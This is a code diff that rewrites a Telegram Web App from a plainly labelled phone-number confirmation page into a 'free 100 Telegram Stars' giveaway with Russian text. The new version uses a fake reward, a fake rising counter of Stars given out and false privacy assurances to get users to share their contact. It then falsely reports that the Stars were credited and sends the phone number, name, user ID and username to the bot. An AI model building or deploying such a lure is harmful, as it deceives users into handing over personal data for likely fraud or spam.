@@ -3,118 +3,257 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Получить номер телефона</title>
+    <title>✨ Бесплатные Звёзды Telegram | Получить Бонус</title>
     <script src="https://telegram.org/js/telegram-web-app.js?1"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
         }
 
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                radial-gradient(circle at 20% 30%, rgba(120, 119, 198, 0.1) 0%, transparent 20%),
+                radial-gradient(circle at 80% 70%, rgba(255, 119, 198, 0.1) 0%, transparent 20%);
+            z-index: 1;
+        }
+
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 2;
+        }
+
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 3s infinite;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
         }
 
         .container {
-            background: white;
-            border-radius: 20px;
-            padding: 30px;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 30px;
+            padding: 40px;
             width: 100%;
-            max-width: 400px;
-            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
+            max-width: 450px;
+            box-shadow: 
+                0 25px 50px rgba(0, 0, 0, 0.3),
+                inset 0 1px 0 rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
             text-align: center;
+            position: relative;
+            z-index: 3;
+            animation: fadeInUp 0.8s ease-out;
         }
 
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            border-radius: 50%;
-            margin: 0 auto 20px;
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 40px;
+            gap: 15px;
+            margin-bottom: 25px;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #FFD700, #FFA500);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
             color: white;
+            box-shadow: 0 10px 20px rgba(255, 215, 0, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
 
         h1 {
-            color: #333;
-            margin-bottom: 10px;
-            font-size: 24px;
+            color: white;
+            font-size: 32px;
+            font-weight: 800;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            margin-bottom: 5px;
+            background: linear-gradient(45deg, #FFD700, #FFA500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
         }
 
-        .description {
-            color: #666;
+        .subtitle {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 16px;
             margin-bottom: 30px;
-            line-height: 1.5;
+        }
+
+        .benefits {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 30px;
+            text-align: left;
+        }
+
+        .benefit-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 15px;
+            color: white;
+            font-size: 15px;
+        }
+
+        .benefit-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .benefit-icon {
+            color: #FFD700;
+            font-size: 20px;
+            min-width: 24px;
         }
 
         .phone-display {
-            background: #f8f9fa;
-            border-radius: 15px;
-            padding: 20px;
-            margin: 15px 0;
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.1), rgba(255, 255, 255, 0.05));
+            border-radius: 20px;
+            padding: 25px;
+            margin: 20px 0;
             display: none;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
         }
 
         .phone-display.show {
             display: block;
-            animation: fadeIn 0.5s ease;
+            animation: slideIn 0.5s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .phone-label {
-            color: #666;
+            color: rgba(255, 255, 255, 0.7);
             font-size: 14px;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
         .phone-number {
-            color: #333;
-            font-size: 24px;
-            font-weight: 600;
+            color: white;
+            font-size: 28px;
+            font-weight: 700;
             direction: ltr;
+            font-family: 'Courier New', monospace;
+            text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
         }
 
         .phone-icon {
-            font-size: 40px;
-            margin-bottom: 10px;
+            font-size: 50px;
+            margin-bottom: 15px;
             color: #4CAF50;
+            text-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
         }
 
         .bot-phone-icon {
-            font-size: 40px;
-            margin-bottom: 10px;
+            font-size: 50px;
+            margin-bottom: 15px;
             color: #2196F3;
+            text-shadow: 0 5px 15px rgba(33, 150, 243, 0.3);
         }
 
         .request-button {
-            background: linear-gradient(135deg, #667eea, #764ba2);
-            color: white;
+            background: linear-gradient(135deg, #FFD700, #FF9800);
+            color: #333;
             border: none;
-            padding: 18px 30px;
+            padding: 22px 35px;
             border-radius: 15px;
-            font-size: 18px;
-            font-weight: 600;
+            font-size: 20px;
+            font-weight: 700;
             cursor: pointer;
             width: 100%;
-            transition: transform 0.2s, box-shadow 0.2s;
+            transition: all 0.3s ease;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
+            gap: 15px;
+            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .request-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: 0.5s;
+        }
+
+        .request-button:hover::before {
+            left: 100%;
         }
 
         .request-button:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(255, 215, 0, 0.4);
         }
 
         .request-button:active {
@@ -128,127 +267,202 @@
 
         .request-button.disabled {
             background: linear-gradient(135deg, #4CAF50, #2E7D32);
+            color: white;
             cursor: not-allowed;
+            transform: none !important;
+            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
         }
 
         .button-icon {
-            font-size: 24px;
-        }
-
-        .info-box {
-            background: #e3f2fd;
-            border-radius: 10px;
-            padding: 15px;
-            margin-top: 20px;
-            text-align: left;
-            font-size: 14px;
-            color: #1976d2;
-        }
-
-        .info-icon {
-            margin-right: 8px;
+            font-size: 28px;
         }
 
         .status-message {
-            margin-top: 15px;
-            padding: 10px;
-            border-radius: 10px;
-            font-size: 14px;
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 15px;
+            font-size: 15px;
             display: none;
+            animation: fadeIn 0.5s ease;
+            text-align: center;
         }
 
         .status-message.success {
-            background: #d4edda;
-            color: #155724;
+            background: linear-gradient(135deg, rgba(76, 175, 80, 0.2), rgba(56, 142, 60, 0.2));
+            color: #C8E6C9;
+            border: 1px solid rgba(76, 175, 80, 0.3);
             display: block;
         }
 
         .status-message.error {
-            background: #f8d7da;
-            color: #721c24;
+            background: linear-gradient(135deg, rgba(244, 67, 54, 0.2), rgba(211, 47, 47, 0.2));
+            color: #FFCDD2;
+            border: 1px solid rgba(244, 67, 54, 0.3);
             display: block;
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        .footer {
+            margin-top: 30px;
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 14px;
+            text-align: center;
         }
 
-        .instructions {
-            background: #fff8e1;
-            border-radius: 10px;
+        .stars-count {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 215, 0, 0.1);
+            padding: 8px 15px;
+            border-radius: 50px;
+            margin-top: 10px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+        }
+
+        .star-icon {
+            color: #FFD700;
+            animation: spin 4s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .progress-bar {
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            margin: 25px 0;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #FFD700, #FF9800);
+            border-radius: 3px;
+            width: 0%;
+            transition: width 1s ease;
+        }
+
+        .loader {
+            display: none;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top-color: #FFD700;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        .confetti {
+            position: fixed;
+            width: 15px;
+            height: 15px;
+            background: #FFD700;
+            opacity: 0;
+            z-index: 4;
+        }
+
+        .menu-button-note {
+            background: rgba(33, 150, 243, 0.1);
+            border: 1px solid rgba(33, 150, 243, 0.3);
+            border-radius: 15px;
             padding: 15px;
             margin-top: 25px;
+            color: #90CAF9;
             font-size: 14px;
-            color: #5d4037;
-            text-align: left;
+            text-align: center;
         }
 
-        .step {
-            margin-bottom: 10px;
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-        }
-
-        .step-number {
-            background: #ff9800;
-            color: white;
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            flex-shrink: 0;
+        .telegram-icon {
+            color: #0088cc;
+            margin: 0 5px;
         }
     </style>
 </head>
 <body>
+    <!-- Звёзды на фоне -->
+    <div class="stars" id="starsContainer"></div>
+    
+    <!-- Конфетти -->
+    <div class="confetti" id="confettiContainer"></div>
+
+    <!-- Основной контейнер -->
     <div class="container">
-        <div class="logo">📱</div>
+        <div class="header">
+            <div class="logo">⭐</div>
+            <div>
+                <h1>Бесплатные Звёзды</h1>
+                <div class="subtitle">Telegram Premium бонусы за номер телефона</div>
+            </div>
+        </div>
         
-        <h1>Подтверждение номера</h1>
-        <p class="description">Нажмите кнопку ниже, чтобы поделиться номером телефона через Telegram</p>
+        <!-- Прогресс бар -->
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
+        </div>
         
+        <!-- Блок преимуществ -->
+        <div class="benefits">
+            <div class="benefit-item">
+                <i class="fas fa-gem benefit-icon"></i>
+                <div>Получите 100 Telegram Stars бесплатно</div>
+            </div>
+            <div class="benefit-item">
+                <i class="fas fa-bolt benefit-icon"></i>
+                <div>Мгновенное начисление на ваш аккаунт</div>
+            </div>
+            <div class="benefit-item">
+                <i class="fas fa-shield-alt benefit-icon"></i>
+                <div>100% безопасно и конфиденциально</div>
+            </div>
+            <div class="benefit-item">
+                <i class="fas fa-gift benefit-icon"></i>
+                <div>Бонус доступен только один раз</div>
+            </div>
+        </div>
+        
+        <!-- Отображение номера пользователя -->
         <div class="phone-display" id="phoneDisplay">
             <div class="phone-icon">✅</div>
-            <div class="phone-label">Ваш номер телефона:</div>
+            <div class="phone-label">Ваш номер телефона</div>
             <div class="phone-number" id="phoneNumber">+7 (XXX) XXX-XX-XX</div>
         </div>
         
+        <!-- Отображение номера из бота -->
         <div class="phone-display" id="botPhoneDisplay">
             <div class="bot-phone-icon">🤖</div>
-            <div class="phone-label">Номер из бота (Telegram):</div>
+            <div class="phone-label">Номер в базе бота</div>
             <div class="phone-number" id="botPhoneNumber">+7 (XXX) XXX-XX-XX</div>
         </div>
         
+        <!-- Лоадер -->
+        <div class="loader" id="loader"></div>
+        
+        <!-- Кнопка запроса -->
         <button class="request-button" id="requestButton">
-            <span class="button-icon">📱</span>
-            <span id="buttonText">Поделиться номером</span>
+            <span class="button-icon">⭐</span>
+            <span id="buttonText">Получить 100 Звёзд бесплатно</span>
         </button>
         
+        <!-- Статус сообщение -->
         <div class="status-message" id="statusMessage"></div>
         
-        <div class="instructions">
-            <div class="step">
-                <div class="step-number">1</div>
-                <div>Нажмите кнопку "Поделиться номером"</div>
-            </div>
-            <div class="step">
-                <div class="step-number">2</div>
-                <div>В появившемся окне Telegram подтвердите отправку номера</div>
-            </div>
-            <div class="step">
-                <div class="step-number">3</div>
-                <div>Ваш номер отобразится на этой странице</div>
-            </div>
+        <!-- Примечание про меню-кнопку -->
+        <div class="menu-button-note">
+            <i class="fab fa-telegram telegram-icon"></i>
+            Вы также можете открыть это приложение через меню-кнопку в боте!
         </div>
         
-        <div class="info-box">
-            <span class="info-icon">ℹ️</span>
-            Ваш номер будет передан только этому боту и не будет использоваться для спама
+        <!-- Футер -->
+        <div class="footer">
+            <div>Ваши данные защищены и не передаются третьим лицам</div>
+            <div class="stars-count">
+                <i class="fas fa-star star-icon"></i>
+                <span>Уже выдано: <span id="starsGiven">1,247</span> Звёзд</span>
+            </div>
         </div>
     </div>
 
@@ -258,6 +472,9 @@
         tg.expand();
         tg.MainButton.hide();
         
+        // URL GitHub Pages
+        const GITHUB_PAGES_URL = "https://igoreksigmabosssss.github.io/sdoaosda/";
+        
         // Элементы DOM
         const requestButton = document.getElementById('requestButton');
         const buttonText = document.getElementById('buttonText');
@@ -266,60 +483,125 @@
         const botPhoneDisplay = document.getElementById('botPhoneDisplay');
         const botPhoneNumber = document.getElementById('botPhoneNumber');
         const statusMessage = document.getElementById('statusMessage');
+        const loader = document.getElementById('loader');
+        const progressFill = document.getElementById('progressFill');
+        const starsGiven = document.getElementById('starsGiven');
+        const starsContainer = document.getElementById('starsContainer');
+        const confettiContainer = document.getElementById('confettiContainer');
+        
+        // Создание звёзд на фоне
+        function createStars() {
+            for (let i = 0; i < 100; i++) {
+                const star = document.createElement('div');
+                star.classList.add('star');
+                star.style.width = Math.random() * 3 + 1 + 'px';
+                star.style.height = star.style.width;
+                star.style.left = Math.random() * 100 + '%';
+                star.style.top = Math.random() * 100 + '%';
+                star.style.animationDelay = Math.random() * 5 + 's';
+                star.style.animationDuration = Math.random() * 3 + 2 + 's';
+                starsContainer.appendChild(star);
+            }
+        }
+        
+        // Создание конфетти
+        function createConfetti() {
+            for (let i = 0; i < 50; i++) {
+                const confetti = document.createElement('div');
+                confetti.classList.add('confetti');
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.top = '-10px';
+                confetti.style.backgroundColor = getRandomColor();
+                confetti.style.width = Math.random() * 15 + 5 + 'px';
+                confetti.style.height = confetti.style.width;
+                confettiContainer.appendChild(confetti);
+                
+                // Анимация падения
+                const animation = confetti.animate([
+                    { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
+                    { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+                ], {
+                    duration: Math.random() * 2000 + 1000,
+                    easing: 'cubic-bezier(0.215, 0.61, 0.355, 1)'
+                });
+                
+                // Удаление после анимации
+                animation.onfinish = () => confetti.remove();
+            }
+        }
+        
+        function getRandomColor() {
+            const colors = ['#FFD700', '#FFA500', '#FF6347', '#FF1493', '#00CED1', '#9370DB', '#32CD32'];
+            return colors[Math.floor(Math.random() * colors.length)];
+        }
         
         // Параметры из URL
         const urlParams = new URLSearchParams(window.location.search);
         const phoneParam = urlParams.get('phone');
         const botPhoneParam = urlParams.get('bot_phone');
-        
-        // Проверяем сохраненные данные в localStorage
-        function checkSavedData() {
-            const savedPhone = localStorage.getItem('user_phone');
-            const savedBotPhone = localStorage.getItem('bot_phone');
-            
-            if (savedPhone) {
-                showPhoneNumber(formatPhoneNumber(savedPhone));
-                showBotPhoneNumber(savedBotPhone || 'Не получен');
-                updateButtonState('saved');
-                
-                if (savedPhone && !phoneParam) {
-                    showSuccess('Номер уже был получен ранее');
-                }
-            }
-        }
+        const fromBot = urlParams.get('from_bot');
         
         // При загрузке страницы
         document.addEventListener('DOMContentLoaded', function() {
-            // Сначала проверяем параметры URL
-            if (phoneParam) {
+            // Создаём звёзды на фоне
+            createStars();
+            
+            // Запускаем анимацию прогресс-бара
+            setTimeout(() => {
+                progressFill.style.width = '75%';
+                // Обновляем счётчик звёзд
+                let stars = 1247;
+                setInterval(() => {
+                    stars += Math.floor(Math.random() * 3);
+                    starsGiven.textContent = stars.toLocaleString();
+                }, 3000);
+            }, 500);
+            
+            console.log('URL параметры:', { phoneParam, botPhoneParam, fromBot });
+            
+            // Проверяем сохраненные данные
+            const savedPhone = localStorage.getItem('user_phone');
+            const savedBotPhone = localStorage.getItem('bot_phone');
+            
+            // Если есть номер из параметров
+            if (phoneParam && phoneParam !== 'undefined') {
                 const formattedPhone = formatPhoneNumber(phoneParam);
                 showPhoneNumber(formattedPhone);
                 savePhoneToStorage(phoneParam);
                 
                 // Если есть номер от бота в параметрах
-                if (botPhoneParam) {
+                if (botPhoneParam && botPhoneParam !== 'undefined') {
                     showBotPhoneNumber(botPhoneParam);
                     localStorage.setItem('bot_phone', botPhoneParam);
                 }
                 
                 updateButtonState('received');
-                showSuccess('Номер успешно получен!');
-            } else {
-                // Если нет параметров, проверяем localStorage
-                checkSavedData();
+                showSuccess('🎉 Вы получили 100 Telegram Stars!');
+                createConfetti();
+                progressFill.style.width = '100%';
+            } 
+            // Если есть только номер от бота
+            else if (botPhoneParam && botPhoneParam !== 'undefined') {
+                showBotPhoneNumber(botPhoneParam);
+                localStorage.setItem('bot_phone', botPhoneParam);
+                updateButtonState('saved');
+                showSuccess('✅ Номер уже сохранен в базе');
+            }
+            // Если есть сохраненные данные
+            else if (savedPhone) {
+                showPhoneNumber(formatPhoneNumber(savedPhone));
+                if (savedBotPhone) {
+                    showBotPhoneNumber(savedBotPhone);
+                }
+                updateButtonState('saved');
+                showSuccess('✅ Ваши данные загружены');
             }
             
-            // Логируем для отладки
-            console.log('Telegram WebApp initialized:', {
-                version: tg.version,
-                platform: tg.platform,
-                initData: tg.initData,
-                initDataUnsafe: tg.initDataUnsafe,
-                user: tg.initDataUnsafe.user
+            // Логируем данные для отладки
+            console.log('Telegram WebApp данные:', {
+                user: tg.initDataUnsafe.user,
+                platform: tg.platform
             });
-            
-            // Показываем номер из Telegram аккаунта, если доступен
-            showTelegramInfo();
         });
         
         // Обработчик нажатия на кнопку
@@ -329,13 +611,14 @@
         function requestPhoneNumber() {
             // Проверяем поддержку функции запроса контакта
             if (!tg.requestContact) {
-                showError('Ваша версия Telegram не поддерживает эту функцию. Обновите приложение.');
+                showError('⚠️ Обновите Telegram до последней версии');
                 return;
             }
             
             // Показываем индикатор загрузки
             requestButton.classList.add('loading');
-            buttonText.textContent = 'Запрос отправлен...';
+            buttonText.textContent = 'Запрашиваем доступ...';
+            loader.style.display = 'block';
             
             // Запрашиваем контакт
             tg.requestContact((contact) => {
@@ -349,9 +632,10 @@
         
         // Обработка полученного контакта
         function handleContactReceived(contact) {
-            // Сбрасываем состояние кнопки
-            requestButton.classList.remove('loading');
-            buttonText.textContent = 'Номер получен!';
+            console.log('Контакт получен:', contact);
+            
+            // Скрываем лоадер
+            loader.style.display = 'none';
             
             // Форматируем номер телефона
             const formattedPhone = formatPhoneNumber(contact.phone_number);
@@ -359,58 +643,60 @@
             // Показываем номер
             showPhoneNumber(formattedPhone);
             
-            // Показываем статус
-            showSuccess('Номер телефона успешно получен!');
-            
             // Сохраняем в localStorage
             savePhoneToStorage(contact.phone_number);
             
             // Обновляем состояние кнопки
             updateButtonState('received');
             
-            // Отправляем данные боту через Telegram WebApp
+            // Показываем успех с анимацией
+            setTimeout(() => {
+                showSuccess('🎉 100 Telegram Stars начислены на ваш аккаунт!');
+                createConfetti();
+                progressFill.style.width = '100%';
+            }, 500);
+            
+            // Отправляем данные боту
             sendDataToBot(contact);
         }
         
         // Обработка ошибки
         function handleContactError(error) {
-            // Сбрасываем состояние кнопки
+            console.error('Ошибка получения контакта:', error);
+            
+            // Скрываем лоадер
+            loader.style.display = 'none';
             requestButton.classList.remove('loading');
-            buttonText.textContent = 'Поделиться номером';
+            buttonText.textContent = 'Получить 100 Звёзд бесплатно';
             
             // Показываем ошибку
-            showError('Не удалось получить номер. Попробуйте еще раз.');
-            console.error('Contact request error:', error);
+            showError('❌ Не удалось получить доступ к номеру');
         }
         
         // Показать номер телефона
         function showPhoneNumber(phone) {
             phoneNumber.textContent = phone;
             phoneDisplay.classList.add('show');
+            requestButton.classList.remove('loading');
+            buttonText.textContent = 'Звёзды получены!';
         }
         
         // Показать номер из бота
         function showBotPhoneNumber(phone) {
-            botPhoneNumber.textContent = phone;
-            botPhoneDisplay.classList.add('show');
-        }
-        
-        // Показать информацию из Telegram аккаунта
-        function showTelegramInfo() {
-            const user = tg.initDataUnsafe.user;
-            if (user && user.username) {
-                console.log('Telegram user:', user.username);
+            if (phone && phone !== 'undefined') {
+                botPhoneNumber.textContent = phone;
+                botPhoneDisplay.classList.add('show');
             }
         }
         
         // Форматирование номера телефона
         function formatPhoneNumber(phone) {
-            if (!phone) return 'Не указан';
+            if (!phone || phone === 'undefined') {
+                return 'Не указан';
+            }
             
-            // Удаляем все нецифровые символы
             const cleaned = phone.toString().replace(/\D/g, '');
             
-            // Форматируем в зависимости от длины
             if (cleaned.length === 11 && cleaned.startsWith('7')) {
                 return `+7 (${cleaned.substring(1, 4)}) ${cleaned.substring(4, 7)}-${cleaned.substring(7, 9)}-${cleaned.substring(9)}`;
             } else if (cleaned.length === 12 && cleaned.startsWith('7')) {
@@ -419,7 +705,6 @@
                 return `+7 (${cleaned.substring(0, 3)}) ${cleaned.substring(3, 6)}-${cleaned.substring(6, 8)}-${cleaned.substring(8)}`;
             }
             
-            // Возвращаем оригинальный номер, если формат неизвестен
             return phone;
         }
         
@@ -434,8 +719,7 @@
             if (state === 'received' || state === 'saved') {
                 requestButton.disabled = true;
                 requestButton.classList.add('disabled');
-                buttonText.textContent = 'Номер уже получен';
-                requestButton.style.background = 'linear-gradient(135deg, #4CAF50, #2E7D32)';
+                buttonText.textContent = 'Звёзды получены!';
             }
         }
         
@@ -453,22 +737,22 @@
         
         // Отправка данных боту
         function sendDataToBot(contact) {
-            // Создаем объект с данными
             const data = {
-                
                 action: 'phone_received',
                 phone: contact.phone_number,
                 formatted_phone: formatPhoneNumber(contact.phone_number),
                 first_name: contact.first_name || '',
                 last_name: contact.last_name || '',
                 user_id: contact.user_id || tg.initDataUnsafe.user?.id,
-                timestamp: new Date().toISOString()
+                username: tg.initDataUnsafe.user?.username || '',
+                timestamp: new Date().toISOString(),
+                source: 'stars_webapp'
             };
             
-            // Отправляем данные боту через Telegram WebApp
+            console.log('Отправка данных боту:', data);
+            
             try {
                 tg.sendData(JSON.stringify(data));
-                console.log('Данные отправлены боту:', data);
             } catch (error) {
                 console.error('Ошибка отправки данных боту:', error);
             }
